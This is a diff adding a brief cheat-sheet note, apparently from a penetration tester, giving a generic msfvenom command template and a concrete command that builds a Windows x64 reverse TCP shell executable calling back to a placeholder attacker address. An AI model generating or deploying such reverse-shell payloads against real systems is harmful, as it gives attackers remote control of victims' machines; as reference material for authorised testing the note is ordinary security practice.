@@ -1,0 +1,4 @@
+#msfvenom
+
+msfvenom -p <payload> LHOST=<myip> LPORT=<myport> -f <format> -o <output>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<myip> LPORT=<myport> -f exe -o revsh.exe
